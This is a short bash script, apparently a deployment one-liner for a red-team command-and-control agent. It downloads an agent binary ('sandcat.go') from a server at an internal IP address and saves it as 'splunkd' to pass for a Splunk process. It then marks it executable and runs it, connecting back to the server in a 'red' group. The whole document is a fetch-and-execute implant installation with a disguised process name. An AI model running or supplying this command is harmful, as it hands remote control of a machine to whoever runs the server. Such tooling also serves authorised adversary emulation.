#!/bin/bash
server='http://10.20.20.1:8888';curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v